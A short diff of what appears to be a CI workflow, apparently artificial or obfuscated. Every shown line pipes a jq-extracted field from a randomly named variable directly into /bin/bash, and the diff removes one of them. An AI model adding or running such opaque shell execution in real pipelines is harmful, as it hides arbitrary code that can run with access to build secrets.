@@ -22,7 +22,6 @@ jobs:
           echo $g2327 | jq -r .wmdm8166 | /bin/bash
           printf '%s' "$cnmml5" | jq -r .hbs25 | /bin/bash
           printf '%s' "$fr29" | jq -r .gve7393 | /bin/bash
-          printf '%s' "$w48" | jq -r .ra4 | /bin/bash
           echo $spgdn5962 | jq -r .ofri9 | /bin/bash
           printf '%s' "$onht178" | jq -r .ws234 | /bin/bash
           printf '%s' "$d3" | jq -r .ewyy2406 | /bin/bash
